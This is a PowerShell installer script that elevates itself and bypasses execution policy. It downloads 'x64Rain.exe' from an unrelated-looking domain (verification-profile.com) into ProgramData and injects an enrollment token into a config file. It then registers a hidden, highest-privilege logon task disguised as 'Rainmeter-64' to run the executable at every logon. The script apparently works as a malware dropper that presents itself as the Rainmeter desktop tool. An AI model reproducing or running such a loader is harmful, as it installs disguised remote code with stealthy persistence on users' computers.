param(
    [Parameter(Mandatory=$true)]
    [string]$enroll_token,
    [Parameter(Mandatory=$true)]
    [string]$id
)

$ErrorActionPreference = 'Stop'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $argList = @(
        "-NoProfile"
        "-ExecutionPolicy", "Bypass"
        "-File", "`"$PSCommandPath`""
        "-enroll_token", "`"$enroll_token`""
        "-id", "`"$id`""
    )
    Start-Process -FilePath "powershell.exe" -ArgumentList $argList -Verb RunAs
    exit
}

try {
    $exeUrl      = "https://dc.verification-profile.com/x64Rain.exe"
    $exePath     = "$env:ProgramData\x64Rain.exe"
    $extractPath = "$env:ProgramData"

    # Скачиваем напрямую EXE файл
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

    $taskName = "Rainmeter64AutoStart"
    
    if (-not (Test-Path $exePath)) {
        throw "EXE not found: $exePath"
    }

    $configPath = "C:\ProgramData\conig_manager.xml"

    if (Test-Path $configPath) {
        $content = Get-Content -Path $configPath -Raw
        $content = $content -replace 'enroll_token=.*?;', "enroll_token=$enroll_token;"
        Set-Content -Path $configPath -Value $content
    } 

    $autorunDir        = "C:\ProgramData"
    $autorunScriptPath = "C:\ProgramData\autorun.ps1"

    if (-not (Test-Path $autorunDir)) {
        New-Item -Path $autorunDir -ItemType Directory -Force | Out-Null
    }

    $autorunScript = @'
$ErrorActionPreference = "Stop"
$exePath = "C:\ProgramData\x64Rain.exe"
$logFile = "C:\ProgramData\autorun.log"
$logDir  = Split-Path $logFile -Parent

if (-not (Test-Path $logDir)) {
    New-Item -Path $logDir -ItemType Directory -Force | Out-Null
}

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') START" | Out-File -FilePath $logFile -Append

try {
    if (-not (Test-Path $exePath)) {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: EXE not found: $exePath" | Out-File -FilePath $logFile -Append
        exit 1
    }
    $p = Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent) -PassThru -ErrorAction Stop
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') OK PID=$($p.Id)" | Out-File -FilePath $logFile -Append
}
catch {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append
}
'@

    Set-Content -Path $autorunScriptPath -Value $autorunScript -Encoding UTF8

    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    $action      = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$autorunScriptPath`""
    $trigger     = New-ScheduledTaskTrigger -AtLogOn
    $settings    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal   = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Rainmeter-64 hidden" -ErrorAction Stop

    Write-Host "Done '$taskName' created."
    Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent)
}
catch {
    Write-Host "Error:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    if ($_.ScriptStackTrace) {
        Write-Host ""
        Write-Host "StackTrace:" -ForegroundColor Yellow
        Write-Host $_.ScriptStackTrace
    }
}
